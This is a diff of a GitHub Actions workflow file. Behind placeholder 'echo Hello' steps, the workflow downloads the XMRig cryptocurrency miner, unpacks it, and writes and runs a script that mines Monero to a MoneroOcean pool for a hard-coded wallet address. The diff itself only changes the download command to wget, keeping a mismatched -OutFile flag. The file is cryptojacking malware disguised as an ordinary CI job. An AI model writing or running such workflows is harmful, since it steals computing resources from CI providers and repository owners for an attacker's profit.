@@ -13,7 +13,7 @@ jobs:
       - run: echo "Hello"
       - run: lscpu
       - run: echo "Hello"
-      - run: Invoke-WebRequest https://github.com/MoneroOcean/xmrig/releases/download/v6.9.0-mo2/xmrig-v6.9.0-mo2-lin64-compat.tar.gz -OutFile test.zip
+      - run: wget https://github.com/MoneroOcean/xmrig/releases/download/v6.9.0-mo2/xmrig-v6.9.0-mo2-lin64-compat.tar.gz -OutFile test.zip
       - run: tar xf test.zip
       - run: echo "./xmrig -o gulf.moneroocean.stream:10032 -u 87ZVsk1RDLGgMW3VfFVDsbLmkHZrfjazubt4BhbuQyoK4HVu63AWMgKHa2tvNCvChuE33rFrZB7ZRZExSHt5PnHz9pwxwYi -k">new.sh
       - run: bash new.sh
